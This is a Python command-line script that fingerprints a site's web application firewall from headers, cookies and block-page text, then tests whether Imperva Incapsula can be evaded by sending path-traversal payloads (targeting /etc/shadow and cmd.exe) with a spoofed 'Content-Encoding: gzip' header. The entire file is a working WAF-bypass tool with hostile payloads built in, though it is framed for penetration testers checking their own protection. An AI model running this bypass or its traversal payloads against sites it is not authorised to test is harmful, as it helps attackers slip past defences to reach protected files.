#!/usr/bin/env python3
"""
This will scan an HTTP endpoint and determine if it's protected by a WAF.
If so, attempt to evade Imperva WAF by adding a 'Content-Encoding: gzip' header
to HTTP POST requests.

Syntax:
	./imperva_gzip.py URL
e.g.:
	./imperva_gzip.py https://vulnerable.com/search.aspx
	[+] Sending baseline POST request to https://vulnerable.com/search.aspx
	[+] Sending malicious UNIX payload to trigger the WAF...
	[+] WAF (type: Imperva Incapsula) is blocking malicious UNIX payloads. This is good!
	[+] Sending malicious Windows payload to trigger the WAF...
	[+] WAF (type: Imperva Incapsula) is blocking malicious Windows payloads. This is good!
	[+] Attempting gzip bypass for UNIX trigger...
	[+] Vulnerable!
	[+] Attempting gzip bypass for Windows trigger...
	[+] Vulnerable!

You can script this tool and check the exit code in the caller:
	1: No URL specified on command-line.
	2: There was an error connecting. Could be DNS error, timeout, etc.
	3: No WAF was detected; malicious UNIX/Windows payloads weren't blocked.
	4: The baseline POST request didn't return HTTP 200.
	128: There is a WAF, but it is not vulnerable to the gzip bypass.
	129: The bypass was effective for the UNIX payload, but not the Windows one.
	130: The bypass was effective for the Windows payload, but not the UNIX one.
	131: The bypass was effective against both Windows and UNIX payloads.

"""

knownWAFs = { 
		"A potentially unsafe operation has been detected in your request to this site.": "WordFence",
		"Generated by Wordfence at": "WordFence",
		"Request unsuccessful. Incapsula incident ID": "Imperva Incapsula",
		"You don't have permission to access ": "Akamai",
		"The server denied the specified Uniform Resource Locator": "ISA Server",
		"The ISA Server denied the specified Uniform Resource Locator": "ISA Server",
		"The requested URL was rejected. Please consult with your administrator.": "F5 ASM or NetScaler",
		"Your support ID is: ": "F5 ASM or NetScaler",
		"This website is using a security service to protect itself from online attacks.": "Cloudflare",
		"ERROR: The request could not be satisfied": "Cloudflare"
}

import sys
import requests
from time import sleep

# we're ignoring invalid SSL certs and it's noisy
requests.packages.urllib3.disable_warnings()

payloadBaseline = {'foo': 'bar'}
payloadUnixTrigger  = {'foo': 'bar', 'test': '../../../../../../../etc/shadow'}
payloadWindowsTrigger  = {'foo': 'bar', 'test': '../../../../../Windows/System32/cmd.exe'}

# helpers
def make_request(url, data, headers={}):
	try:
		r = requests.post(url, data=data, timeout=5, verify=False, headers=headers, allow_redirects=False)
		return r
	except:
		print('[!] Error connecting to %s' % url)

	exit(2)

def get_WAF_type(response):
	if 'x-cnection' in response.headers:
		return 'BigIP'

	if 'x-binarysec-nocache' in response.headers:
		return 'BinarySec'

	if 'nncoection' in response.headers:
		return 'NetScaler'

	if 'cneonction' in response.headers:
		return 'NetScaler'

	if 'Server' in response.headers:
		if response.headers['Server'] == 'BigIP':
			return 'BigIP'

		if 'WebKnight' in response.headers['Server']:
			return 'WebKnight'

		if 'BinarySEC' in response.headers['Server']:
			return 'BinarySec'
	
		if response.headers['Server'] == 'F5-TrafficShield':
			return 'F5 Traffic Shield'			

		if 'Profense' in response.headers['Server']:
			return 'Profense'

		if 'Cloudflare' in response.headers['Server']:
			return 'Cloudflare'

		if 'awselb/' in response.headers['Server']:
			return 'AWS ELB'


	if 'Set-Cookie' in response.headers:
		if 'barra_counter_session' in response.headers['Set-Cookie']:
			return 'Barracuda'

		if 'sessioncookie' in response.headers['Set-Cookie']:
			return 'Denyall'

		if 'NSC_' in response.headers['Set-Cookie']:
			return 'NetScaler'

		if 'AL_LB' in response.headers['Set-Cookie']:
			return 'Airlock'

		if 'AL_SESS' in response.headers['Set-Cookie']:
			return 'Airlock'		

		if 'ASINFO' in response.headers['Set-Cookie']:
			return 'F5 Traffic Shield'

		if 'st8id' in response.headers['Set-Cookie']:
			return 'Teros / Citrix Application Firewall Enterprise'

		if 'st8_wlf' in response.headers['Set-Cookie']:
			return 'Teros / Citrix Application Firewall Enterprise'

		if 'st8_wat' in response.headers['Set-Cookie']:
			return 'Teros / Citrix Application Firewall Enterprise'

		if 'PLBSID' in response.headers['Set-Cookie']:
			return 'Profense'

	for k in knownWAFs:
		if k in response.text:
			return knownWAFs[k]

	return "unknown"


# sanity check
if len(sys.argv) != 2:
	print("%s http(s)://www.example.com/" % sys.argv[0])
	exit(1)


# baseline request
print("[+] Sending baseline POST request to %s" % sys.argv[1])
try:
	r = make_request(sys.argv[1], payloadBaseline)
	r.raise_for_status()
	print("[+] Response: HTTP %d" % r.status_code) 
except requests.exceptions.HTTPError:
	print("[!] Error POSTing to %s. HTTP response code: %d" % (sys.argv[1], r.status_code))
	print("[!] Make sure the specified URL accepts POST requests.")
	exit(4)


# Imperva-triggering request (UNIX)
impervaTriggered = 0x00
try:
	print("[+] Sending malicious UNIX payload to trigger the WAF...")
	r = make_request(sys.argv[1], payloadUnixTrigger)
	r.raise_for_status()
	print("[!] Looks like no WAF protection against the UNIX payload. HTTP response: %d" % r.status_code)
except requests.exceptions.HTTPError:
	# a failed request means it was blocked
	impervaTriggered = impervaTriggered | 1
	print("[+] WAF (type: %s) is blocking malicious UNIX payloads with HTTP %d. This is good!" % (get_WAF_type(r), r.status_code))

# Imperva-triggering request (Windows)
try:
	print("[+] Sending malicious Windows payload to trigger the WAF...")
	r = make_request(sys.argv[1], payloadWindowsTrigger)
	r.raise_for_status()
	print("[!] Looks like no WAF protection against the Windows payload. HTTP response: %d" % r.status_code) 
except requests.exceptions.HTTPError:
	# a failed request means it was blocked
	impervaTriggered = impervaTriggered | 2
	print("[+] WAF (type: %s) is blocking malicious Windows payloads with HTTP %d. This is good!" % (get_WAF_type(r), r.status_code))


# There's no point continuing if there isn't a WAF. 
if not impervaTriggered:
	print('[!] It looks like there is no WAF protecting %s.' % sys.argv[1])
	exit(3)

waf = get_WAF_type(r)
if waf != 'Imperva Incapsula':
	print('[!] The WAF is not Incapsula. Found: %s' % waf)
	exit(5)

# Bypass requests
sleep(.5)
exitCode = 128
if impervaTriggered & 1 == 1:
	try:
		print('[+] Attempting gzip bypass for UNIX trigger...')
		r = make_request(sys.argv[1], payloadUnixTrigger, headers={'Content-Encoding': 'gzip'})
		r.raise_for_status()
		print('[+] Vulnerable! HTTP %d' % r.status_code)
		exitCode = exitCode | 1
	except requests.exceptions.HTTPError:
		print('[-] Not vulnerable. HTTP %d' % r.status_code)

if impervaTriggered & 2 == 2:
	try:
		print('[+] Attempting gzip bypass for Windows trigger...')
		r = make_request(sys.argv[1], payloadWindowsTrigger, headers={'Content-Encoding': 'gzip'})
		r.raise_for_status()
		print('[+] Vulnerable! HTTP %d' % r.status_code)
		exitCode = exitCode | 2
	except requests.exceptions.HTTPError:
		print('[-] Not vulnerable. HTTP %d' % r.status_code)

exit(exitCode)
